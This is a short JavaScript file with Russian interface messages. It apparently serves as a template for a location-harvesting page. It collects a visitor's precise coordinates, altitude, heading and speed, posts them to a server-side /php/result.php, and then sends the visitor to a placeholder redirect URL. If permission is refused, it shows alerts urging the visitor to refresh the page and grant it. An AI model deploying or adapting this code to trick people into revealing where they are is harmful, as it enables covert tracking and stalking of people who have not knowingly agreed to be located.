function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Не поддерживается в вашем браузере...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;

    $.ajax({
      type: 'POST',
      url: '/php/result.php',
      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
      success: function(){window.location='REDIRECT_URL';},
      mimeType: 'text'
    });
  };
}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'Пользовател отказался показать местоположение';
      alert('Пожалуйста обновите страницу и дайте разрешение на местоположение для лучших результатов...');
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'Сведении о местоположении недоступны';
			break;
		case error.TIMEOUT:
			var timeout = 'Первишен интервал запросов! Упс! ';
      alert('Выберите точность местоположение...');
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'Неизвестная ошибка! Упс!';
			break;
	}

  $.ajax({
    type: 'POST',
    url: '/php/error.php',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
    success: function(){$('#change').html('Failed');},
    mimeType: 'text'
  });
}
